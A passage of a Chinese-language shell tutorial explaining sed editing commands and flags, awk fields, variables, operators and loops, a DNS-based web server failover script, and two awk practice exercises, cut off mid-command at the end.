<li>文件内容修改操作—更改,将一行中匹配的内容替换为新的数据，使用命令c。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将data1文件中的所有行的内容更改为: change data <span class="string">&quot;data&quot;</span></span></span><br><span class="line">sed &#x27;c\change data &quot;haha&quot;&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">将data1文件第二行的内容更改为: change data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;2c\change data &quot;haha&quot;&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">将data1文件中的第二、三、四行的内容更改为：change data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;2,4c\change data &quot;haha&quot;&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">将data1文件中包含<span class="string">&quot;3 the&quot;</span>的行内容更改为: change data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;/3 the/c\change data &quot;data&quot;&#x27; data1</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>文件内容修改操作—字符转换，将一行中匹配的内容替换为新的数据，使用命令y。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将data1中的a b c字符转换为对应的 A  B  C字符</span></span><br><span class="line">sed &#x27;y/abc/ABC/&#x27; data1</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>文件内容删除，将文件中的指定数据删除，使用命令d。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">删除文件data1中的所有数据</span></span><br><span class="line">sed &#x27;d&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">删除文件data1中的第三行数据</span></span><br><span class="line">sed &#x27;3d&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">删除文件data1第三到第四行的数据</span></span><br><span class="line">sed &#x27;3,4d&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">删除文件data1中包含字符串<span class="string">&quot;3 the&quot;</span>的行</span></span><br><span class="line">sed &#x27;/3 the/d&#x27; data1</span><br></pre></td></tr></table></figure>
<ol start="7">
<li>文件内容查看，将文件内容输出到屏幕，使用命令p。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打印data1文件内容</span></span><br><span class="line">sed &#x27;p&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">打印data1文件第三行的内容</span></span><br><span class="line">sed &#x27;3p&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">打印data1文件第二、三、四行内容</span></span><br><span class="line">sed &#x27;2,4p&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">打印data1文件包含字符串<span class="string">&quot;3 the&quot;</span>的行</span></span><br><span class="line">sed &#x27;/3 the/p&#x27; data1</span><br></pre></td></tr></table></figure>
<p>可以看得出，打印内容是重复的行，原因是打印了指定文件内容一次，又将读入缓存的所有数据打印了一次，所以会看到这样的效果，如果不想看到这样的结果，可以加命令选项-n抑制内存输出即可</p>
<h5 id="2-2-2命令选项说明"><a href="#2-2-2命令选项说明" class="headerlink" title="2.2.2命令选项说明"></a>2.2.2命令选项说明</h5><ol>
<li>在命令行中使用多个命令 -e</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将brown替换为green dog替换为cat</span></span><br><span class="line">sed -e &#x27;s/brown/green/;s/dog/cat/&#x27; data1</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>从文件读取编辑器命令 -f 适用于日常重复执行的场景</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">1)将命令写入文件</span></span><br><span class="line">vim abc</span><br><span class="line">s/brown/green/</span><br><span class="line">s/dog/cat/</span><br><span class="line">s/fox/elephant/</span><br><span class="line"><span class="meta">#</span><span class="bash">2)使用-f命令选项调用命令文件</span></span><br><span class="line">sed -f abc data1 </span><br></pre></td></tr></table></figure>
<ol start="3">
<li>抑制内存输出 -n</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打印data1文件的第二行到最后一行内容  $最后的意思</span></span><br><span class="line">sed -n &#x27;2,$p&#x27; data1 </span><br></pre></td></tr></table></figure>
<ol start="4">
<li>使用正则表达式 -r</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打印data1中以字符串<span class="string">&quot;3 the&quot;</span>开头的行内容</span></span><br><span class="line">sed -n  -r &#x27;/^(3 the)/p&#x27; data1</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>从上述的演示中，大家可以看出，数据处理只是在缓存中完成的，并没有实际修改文件内容，如果需要修改文件内容可以直接使用-i命令选项。在这里我需要说明的是-i是一个不可逆的操作，一旦修改，如果想复原就很困难，几乎不可能，所以建议大家在操作的时候可以备份一下源文件。-i命令选项提供了备份功能，比如参数使用-i.bak，那么在修改源文件的同时会先备份一个以.bak结尾的源文件，然后再进行修改操作。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">执行替换命令并修改文件</span></span><br><span class="line">sed -i.bak &#x27;s/brown/green/&#x27; data1</span><br></pre></td></tr></table></figure>
<h5 id="2-2-3标志"><a href="#2-2-3标志" class="headerlink" title="2.2.3标志"></a>2.2.3标志</h5><ol>
<li>数字标志：此标志是一个非零正数，默认情况下，执行替换的时候，如果一行中有多个符合的字符串，如果没有标志位定义，那么只会替换第一个字符串，其他的就被忽略掉了，为了能精确替换，可以使用数字位做定义。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">替换一行中的第二处dog为cat</span></span><br><span class="line">sed &#x27;s/dog/cat/2&#x27; data2</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>g标志:将一行中的所有符合的字符串全部执行替换</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将data1文件中的所有dog替换为cat</span></span><br><span class="line">sed &#x27;s/dog/cat/g&#x27; data2</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>p标志：打印文本内容，类似于-p命令选项</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将data2文件第三行中的dog换成cat并打印</span></span><br><span class="line">sed  &#x27;3s/dog/cat/p&#x27; data2</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>w filename标志:将修改的内容存入filename文件中</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将data2文件第三行中的dog换成cat并保存在text文件中</span></span><br><span class="line">sed  &#x27;3s/dog/cat/w text&#x27; data2</span><br></pre></td></tr></table></figure>


<h3 id="3-sed小技巧"><a href="#3-sed小技巧" class="headerlink" title="3. sed小技巧"></a>3. sed小技巧</h3><p>$= 统计文本有多少行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">统计data2有多少行</span></span><br><span class="line">sed -n &#x27;$=&#x27; data2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">打印data2内容时加上行号</span></span><br><span class="line">sed  &#x27;=&#x27; data2</span><br></pre></td></tr></table></figure>


<h3 id="4-实战-1"><a href="#4-实战-1" class="headerlink" title="4.实战"></a>4.实战</h3><p>DNS监测WEB服务状态，并根据其状态实现高可用解析</p>
<p>场景：通过DNS进行单域名多条A记录解析做负载均衡。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">CP1=0</span><br><span class="line">CP2=0</span><br><span class="line">while :</span><br><span class="line">  do</span><br><span class="line"><span class="meta">#</span><span class="bash">tong</span></span><br><span class="line">     ping -c1 192.168.18.240 &gt; /dev/null</span><br><span class="line">     if [ $? -eq 1 ] &amp;&amp; [ $CP1 -eq 0 ]</span><br><span class="line">        then</span><br><span class="line">           sed -i &#x27;/192.168.18.240/s/^/;/&#x27; /var/named/baidu.zone</span><br><span class="line">           /etc/init.d/named reload</span><br><span class="line">           CP1=1</span><br><span class="line">      fi</span><br><span class="line"><span class="meta">#</span><span class="bash">butong</span></span><br><span class="line">     ping -c1 192.168.18.240 &gt; /dev/null </span><br><span class="line">     if [ $? -eq 0 ] &amp;&amp; [ $CP1 -eq 1 ]</span><br><span class="line">        then</span><br><span class="line">            sed -i &#x27;/192.168.18.240/s/;//&#x27; /var/named/baidu.zone</span><br><span class="line">            /etc/init.d/named reload</span><br><span class="line">            CP1=0</span><br><span class="line">     fi </span><br><span class="line">    ping -c1 192.168.18.241 &gt; /dev/null</span><br><span class="line">    if [ $? -eq 1 ] &amp;&amp; [ $CP2 -eq 0 ]</span><br><span class="line">        then</span><br><span class="line">          sed -i &#x27;/192.168.18.241/s/^/;/&#x27; /var/named/baidu.zone</span><br><span class="line">          /etc/init.d/named reload</span><br><span class="line">          CP2=1</span><br><span class="line">    fi</span><br><span class="line">       ping -c1 192.168.18.241 &gt; /dev/null</span><br><span class="line">     if [ $? -eq 0 ] &amp;&amp; [ $CP2 -eq 1 ]</span><br><span class="line">        then</span><br><span class="line">            sed -i &#x27;/192.168.18.241/s/;//&#x27; /var/named/baidu.zone</span><br><span class="line">            /etc/init.d/named reload</span><br><span class="line">            CP2=0</span><br><span class="line">     fi</span><br><span class="line">sleep 5</span><br><span class="line">done</span><br></pre></td></tr></table></figure>


<h2 id="十五、shell对输出流的处理"><a href="#十五、shell对输出流的处理" class="headerlink" title="十五、shell对输出流的处理"></a>十五、shell对输出流的处理</h2><ul>
<li>awk介绍</li>
<li>awk基本用法</li>
<li>awk高级用法</li>
<li>awk小技巧</li>
</ul>
<hr>
<p>在日常计算机管理中，总会有很多数据输出到屏幕或者文件，这些输出包含了标准输出、标准错误输出。默认情况下，这些信息全部输出到默认输出设备—-屏幕。然而，大量的数据输出中，只有一小部分是我们需要重点关注的，我们需要把我们需要的或者关注的这些信息过滤或者提取以备后续需要时调用。早先的学习中，我们学过使用grep来过滤这些数据，使用cut、tr命令提出某些字段，但是他们都不具备提取并处理数据的能力，都必须先过滤，再提取转存到变量，然后在通过变量提取去处理，比如：</p>
<p>内存使用率的统计步骤：</p>
<ol>
<li>通过free -m提取出内存总量，赋值给变量 memory_totle</li>
<li>通过free -m提取出n内存使用量，赋值给变量memory_use</li>
<li>通过数学运算计算内存使用率</li>
</ol>
<p>需要执行多步才能得到内存使用率，那么有没有一个命令能够集过滤、提取、运算为一体呢？当然，就是今天我要给大家介绍的命令：awk</p>
<p>平行命令还有gawk、pgawk、dgawk</p>
<h3 id="1-awk介绍"><a href="#1-awk介绍" class="headerlink" title="1. awk介绍"></a>1. awk介绍</h3><p>awk是一种可以处理数据、产生格式化报表的语言，功能十分强大。awk 认为文件中的每一行是一条记录 记录与记录的分隔符为换行符,每一列是一个字段 字段与字段的分隔符默认是一个或多个空格或tab制表符.</p>
<p>awk的工作方式是读取数据，将每一行数据视为一条记录（record）每条记录以字段分隔符分成若干字段，然后输出各个字段的值.</p>
<p>awk语法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk [options] [BEGIN]&#123;program&#125; [END][file]</span><br></pre></td></tr></table></figure>
<p>常用命令选项</p>
<table>
<thead>
<tr>
<th align="center">选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-F fs</td>
<td>指定描绘一行中数据字段的文件分隔符  默认为空格</td>
</tr>
<tr>
<td align="center">-f file</td>
<td>指定读取程序的文件名</td>
</tr>
<tr>
<td align="center">-v var=value</td>
<td>定义awk程序中使用的变量和默认值</td>
</tr>
</tbody></table>
<p><strong>注意：</strong>awk 程序脚本由左大括号和右大括号定义。脚本命令必须放置在两个大括号之间。由于awk命令行假定脚本是单文本字符串，所以必须将脚本包括在单引号内。</p>
<p>awk程序运行优先级是:</p>
<ol>
<li>BEGIN: 在开始处理数据流之前执行，可选项</li>
<li>program: 如何处理数据流，必选项</li>
<li>END: 处理完数据流后执行，可选项</li>
</ol>
<h3 id="2-awk的基本用法—-awk数据提取功能"><a href="#2-awk的基本用法—-awk数据提取功能" class="headerlink" title="2. awk的基本用法—-awk数据提取功能"></a>2. awk的基本用法—-awk数据提取功能</h3><h4 id="2-1-awk对字段-列-的提取"><a href="#2-1-awk对字段-列-的提取" class="headerlink" title="2.1 awk对字段(列)的提取"></a>2.1 awk对字段(列)的提取</h4><p>字段提取:提取一个文本中的一列数据并打印输出</p>
<p>字段相关内置变量</p>
<table>
<thead>
<tr>
<th align="center">变量</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$0</td>
<td>表示整行文本</td>
</tr>
<tr>
<td align="center">$1</td>
<td>表示文本行中的第一个数据字段</td>
</tr>
<tr>
<td align="center">$2</td>
<td>表示文本行中的第二个数据字段</td>
</tr>
<tr>
<td align="center">$N</td>
<td>表示文本行中的第N个数据字段</td>
</tr>
<tr>
<td align="center">$NF</td>
<td>表示文本行中的最后一个数据字段</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">读入<span class="built_in">test</span>每行数据并把每行数据打印出来</span></span><br><span class="line">awk &#x27;&#123;print $0&#125;&#x27; test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">打印<span class="built_in">test</span>第六个字段</span></span><br><span class="line">awk &#x27;&#123;print $6&#125;&#x27; test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">打印<span class="built_in">test</span>最后一个字段</span></span><br><span class="line">awk &#x27;&#123;print $NF&#125;&#x27; test</span><br></pre></td></tr></table></figure>
<h4 id="2-2命令选项详解"><a href="#2-2命令选项详解" class="headerlink" title="2.2命令选项详解"></a>2.2命令选项详解</h4><p>-F: 指定字段与字段的分隔符</p>
<p>当输出的数据流字段格式不是awk默认的字段格式时，我们可以使用-F命令选项来重新定义数据流字段分隔符。比如：处理的文件是/etc/passwd，希望打印第一列、第三列、最后一列</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk -F &#x27;:&#x27; &#x27;&#123;print $1,$3,$NF&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<p>​    <strong>可以看的出，awk输出字段默认的分隔符也是空格</strong></p>
<p>-f file: 如果awk命令是日常重复工作，而又没有太多变化，可以将程序写入文件，每次使用-f调用程序文件就好，方便，高效。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk -f abc test  #abc是文件名</span><br></pre></td></tr></table></figure>
<p>-v 定义变量，既然作者写awk的时候就是按着语言去写的，那么语言中最重要的要素—-变量肯定不能缺席，所以可以使用-v命令选项定义变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">定义一个变量 name=baism，然后调用变量读出数据</span></span><br><span class="line">awk -v name=&#x27;baism&#x27; &#x27;BEGIN&#123;print name&#125;&#x27;		</span><br></pre></td></tr></table></figure>
<h4 id="2-3-awk对记录-行-的提取"><a href="#2-3-awk对记录-行-的提取" class="headerlink" title="2.3 awk对记录(行)的提取"></a>2.3 awk对记录(行)的提取</h4><p>记录提取：提取一个文本中的一行并打印输出</p>
<p>记录的提取方法有两种：a、通过行号 b、通过正则匹配</p>
<p>记录相关内置变量</p>
<p>NR: 指定行号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">提取<span class="built_in">test</span>第三行数据</span></span><br><span class="line">awk &#x27;NR==3&#123;print $0&#125;&#x27; test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">指定行的第一个字段精确匹配字符串为3</span></span><br><span class="line">awk &#x27;$1==&quot;3&quot;&#123;print $0&#125;&#x27; test</span><br></pre></td></tr></table></figure>
<h4 id="2-4-awk对字符串提取"><a href="#2-4-awk对字符串提取" class="headerlink" title="2.4 awk对字符串提取"></a>2.4 awk对字符串提取</h4><p>记录和字段的汇合点就是字符串</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打印<span class="built_in">test</span>第三行的第六个字段</span></span><br><span class="line">awk &#x27;NR==3&#123;print $6&#125;&#x27; test</span><br></pre></td></tr></table></figure>
<h4 id="2-5-awk程序的优先级"><a href="#2-5-awk程序的优先级" class="headerlink" title="2.5 awk程序的优先级"></a>2.5 awk程序的优先级</h4><p>关于awk程序的执行优先级，BEGIN是优先级最高的代码块，是在执行PROGRAM之前执行的，不需要提供数据源，因为不涉及到任何数据的处理，也不依赖与PROGRAM代码块；PROGRAM是对数据流干什么，是必选代码块，也是默认代码块。所以在执行时必须提供数据源；END是处理完数据流后的操作，如果需要执行END代码块，就必须需要PROGRAM的支持，单个无法执行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;print &quot;hello ayitula&quot;&#125;&#123;print $0&#125;END&#123;print &quot;bye ayitula&quot;&#125;&#x27; test</span><br><span class="line">awk &#x27;BEGIN&#123;print &quot;hello world&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>


<h3 id="3-awk高级用法"><a href="#3-awk高级用法" class="headerlink" title="3. awk高级用法"></a>3. awk高级用法</h3><p>awk是一门语言，那么就会符合语言的特性，除了可以定义变量外，还可以定义数组，还可以进行运算，流程控制，我们接下来看看吧。</p>
<h4 id="3-1-awk定义数组"><a href="#3-1-awk定义数组" class="headerlink" title="3.1 awk定义数组"></a>3.1 awk定义数组</h4><p>数组定义方式: 数组名[索引]=值</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">定义数组array，有两个元素，分别是100，200，打印数组元素</span></span><br><span class="line">awk &#x27;BEGIN&#123;array[0]=100;array[1]=200;print array[0],array[1]&#125;&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="3-2-awk运算"><a href="#3-2-awk运算" class="headerlink" title="3.2 awk运算"></a>3.2 awk运算</h4><table>
<thead>
<tr>
<th align="center">运算类型</th>
<th>运算符</th>
</tr>
</thead>
<tbody><tr>
<td align="center">赋值运算</td>
<td>=</td>
</tr>
<tr>
<td align="center">比较运算</td>
<td>&gt;   &gt;=   ==   &lt;   &lt;=   !=</td>
</tr>
<tr>
<td align="center">数学运算</td>
<td>+   -   *  /   %   **   ++   —</td>
</tr>
<tr>
<td align="center">逻辑运算</td>
<td>&amp;&amp;  ||</td>
</tr>
<tr>
<td align="center">匹配运算</td>
<td>~   !~</td>
</tr>
</tbody></table>
<ol>
<li>赋值运算：主要是对变量或者数组赋值</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk -v name=&#x27;baism&#x27; &#x27;BEGIN&#123;print name&#125;&#x27;</span><br><span class="line">awk &#x27;BEGIN&#123;school=&quot;ayitula&quot;;print school&#125;&#x27;</span><br><span class="line">awk &#x27;BEGIN&#123;array[0]=100;print array[0]&#125;&#x27;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>比较运算，如果比较的是字符串则按ascii编码顺序表比较。如果结果返回为真则用1表示，如果返回为假则用0表示</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;print &quot;a&quot; &gt;= &quot;b&quot; &#125;&#x27;		#0</span><br><span class="line">awk &#x27;BEGIN&#123;print &quot;a&quot; &lt;= &quot;b&quot; &#125;&#x27;		#1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">输出<span class="built_in">test</span>文件中第一个字段大于4的那一行</span></span><br><span class="line">awk &#x27;$1&gt;4&#123;print $0&#125;&#x27; test  </span><br><span class="line"></span><br><span class="line">awk &#x27;BEGIN&#123;print 100 &gt;= 1 &#125;&#x27;		#1</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>数学运算</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;print 100+3 &#125;&#x27;		#103</span><br><span class="line">awk &#x27;BEGIN&#123;print 10**3 &#125;&#x27;		#1000</span><br><span class="line">awk -v &#x27;count=0&#x27; &#x27;BEGIN&#123;count++;print count&#125;&#x27;		#1</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>逻辑运算</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;print 100&gt;=2 &amp;&amp; 100&gt;=3 &#125;&#x27;		#1</span><br><span class="line">awk &#x27;BEGIN&#123;print 100&gt;=2 || 1&gt;=100 &#125;&#x27;		#1</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>匹配运算</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">匹配/etc/passwd文件中，第一个字段是ro开头的那一行</span></span><br><span class="line">awk -F &#x27;:&#x27; &#x27;$1 ~ &quot;^ro&quot; &#123;print $0&#125;&#x27; /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">匹配/etc/passwd文件中，第一个字段不是ro开头的那一行</span></span><br><span class="line">awk -F &#x27;:&#x27; &#x27;$1 !~ &quot;^ro&quot; &#123;print $0&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<h4 id="3-3-awk-环境变量"><a href="#3-3-awk-环境变量" class="headerlink" title="3.3 awk 环境变量"></a>3.3 awk 环境变量</h4><table>
<thead>
<tr>
<th align="center"><strong>变量</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">FIELDWIDTHS</td>
<td>以空格分隔的数字列表，用空格定义每个数据字段的精确宽度</td>
</tr>
<tr>
<td align="center">FS</td>
<td>输入字段分隔符号</td>
</tr>
<tr>
<td align="center">OFS</td>
<td>输出字段分隔符号</td>
</tr>
<tr>
<td align="center">RS</td>
<td>输入记录分隔符</td>
</tr>
<tr>
<td align="center">ORS</td>
<td>输出记录分隔符号</td>
</tr>
</tbody></table>
<ol>
<li>FIELDWIDTHS:重定义列宽并打印，注意不可以使用$0打印所有，因为$0是打印本行全内容，不会打印你定义的字段</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">输出/etc/passwd文件第一行中的第1，2，3列，并且第一列是5个字符，第二列2个字符，第三列8个字符</span></span><br><span class="line">awk &#x27;BEGIN&#123;FIELDWIDTHS=&quot;5 2 8&quot;&#125;NR==1&#123;print $1,$2,$3&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>FS:指定数据源中字段分隔符，类似命令选项-F</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">指定数据源字段的分隔符为<span class="string">&#x27;:&#x27;</span></span></span><br><span class="line">awk &#x27;BEGIN&#123;FS=&quot;:&quot;&#125;NR==1&#123;print $1,$3,$NF&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>OFS:指定输出到屏幕后字段的分隔符</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">指定数据源字段的分隔符为<span class="string">&#x27;:&#x27;</span>，并指定输出字段的分隔符为<span class="string">&#x27;-&#x27;</span></span></span><br><span class="line">awk &#x27;BEGIN&#123;FS=&quot;:&quot;;OFS=&quot;-&quot;&#125;NR==1&#123;print $1,$3,$NF&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>RS:指定输入记录（行）的分隔符，默认是回车</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">把输入所有记录（行）的分隔符都设置为空</span></span><br><span class="line">awk &#x27;BEGIN&#123;RS=&quot;&quot;&#125;&#123;print $1,$13,$25,$37,$49&#125;&#x27; test</span><br></pre></td></tr></table></figure>
<p><strong>将记录的分隔符修改为空行后，所有的行会变成一行，所以所有字段就在一行了。</strong></p>
<ol start="5">
<li>ORS:输出到屏幕后记录（行）的分隔符，默认为回车</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">把输入所有记录（行）的分隔符都设置为空，输出记录（行）的分隔符设置为*</span></span><br><span class="line">awk &#x27;BEGIN&#123;RS=&quot;&quot;;ORS=&quot;*&quot;&#125;&#123;print $1,$13,$25,$37,$49&#125;&#x27; test</span><br></pre></td></tr></table></figure>
<h4 id="3-4流程控制"><a href="#3-4流程控制" class="headerlink" title="3.4流程控制"></a>3.4流程控制</h4><ol>
<li>if判断语句</li>
<li>for循环语句</li>
<li>while循环语句</li>
<li>do…while语句</li>
<li>循环控制</li>
</ol>
<p>if判断语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打印<span class="variable">$1</span>大于5的行</span></span><br><span class="line">awk &#x27;&#123;if($1&gt;5)print $0&#125;&#x27; num</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">假如<span class="variable">$1</span>大于5则除以2输出，否则乘以2输出</span></span><br><span class="line">awk &#x27;&#123;if($1&gt;5)print $1/2;else print $1*2&#125;&#x27; num</span><br></pre></td></tr></table></figure>
<p>for循环语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将一行中的数据都加起来  <span class="variable">$1</span>+<span class="variable">$2</span>+<span class="variable">$3</span></span></span><br><span class="line">awk &#x27;&#123;sum=0;for (i=1;i&lt;4;i++)&#123;sum+=$i&#125;print sum&#125;&#x27; num2</span><br></pre></td></tr></table></figure>
<p>while循环语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将文件中的每行的数值累加，和大于或等于150就停止累加</span></span><br><span class="line">awk &#x27;&#123;sum=0;i=1;while(sum&lt;150)&#123;sum+=$i;i++&#125;print sum&#125;&#x27; num2</span><br></pre></td></tr></table></figure>
<p>do…while循环语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;&#123;sum=0;i=1;do&#123;sum+=$i;i++&#125;while(sum&lt;150);print sum&#125;&#x27; num2</span><br></pre></td></tr></table></figure>
<p>循环控制语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">累加每行数值，和大于150停止累加</span></span><br><span class="line">awk &#x27;&#123;sum=0;i=1;while(i&lt;4)&#123;sum+=$i;if (sum&gt;150)&#123;break&#125;;i++;&#125;;print sum&#125;&#x27; num2</span><br></pre></td></tr></table></figure>


<h3 id="4-awk小技巧"><a href="#4-awk小技巧" class="headerlink" title="4. awk小技巧"></a>4. awk小技巧</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打印<span class="built_in">test</span>文本的行数</span> </span><br><span class="line">awk &#x27;END&#123;print NR&#125;&#x27; test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">打印<span class="built_in">test</span>文本最后一行内容</span></span><br><span class="line">awk &#x27;END&#123;print $0&#125;&#x27; test </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">打印<span class="built_in">test</span>文本列数</span></span><br><span class="line">awk &#x27;END&#123;print NF&#125;&#x27; test </span><br></pre></td></tr></table></figure>


<h3 id="5-实战"><a href="#5-实战" class="headerlink" title="5.实战"></a>5.实战</h3><p>练习一</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www ~]# cat contacts </span><br><span class="line">Riley Mullen</span><br><span class="line">123 Main Street</span><br><span class="line">Chicago,IL 60602</span><br><span class="line">(312)555-1234</span><br><span class="line">Riley Mullen</span><br><span class="line">123 Main Street</span><br><span class="line">Chicago,IL 60602</span><br><span class="line">(312)555-1234</span><br><span class="line">Riley Mullen</span><br><span class="line">123 Main Street</span><br><span class="line">Chicago,IL 60602</span><br><span class="line">(312)555-1234</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">期望输出</span></span><br><span class="line">Riley Mullen (312)555-1234</span><br><span class="line">Riley Mullen (312)555-1234</span><br><span class="line">Riley Mullen (312)555-1234</span><br><span class="line"></span><br><span class="line">[root@www ~]# awk &#x27;BEGIN&#123;RS=&quot;&quot;;FS=&quot;\n&quot;&#125;&#123;print $1,$4&#125;&#x27; contacts </span><br><span class="line">Riley Mullen (312)555-1234</span><br><span class="line">Riley Mullen (312)555-1234</span><br><span class="line">Riley Mullen (312)555-1234</span><br></pre></td></tr></table></figure>
<p>练习二</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www ~]# cat ip</span><br><span class="line">192.168.1</span><br><span class="line">192.168.2</span><br><span class="line">192.168.3</span><br><span class="line">172.16.3</span><br><span class="line">192.16.1</span><br><span class="line">192.16.2</span><br><span class="line">192.16.3</span><br><span class="line">10.0.4</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">期望输出</span></span><br><span class="line">192.168.1-192.168.3</span><br><span class="line">172.16.3</span><br><span class="line">192.16.3-192.16.1</span><br><span class="line">10.0.4</span><br><span class="line"></span><br><span class="line">[root@www ~]# awk &#x27;BEGIN&#123;RS=&quot;&quot;;OFS=&quot;\n&quot;&#125;&#123;print $1 &quot;-&quot; $3,$4,$7 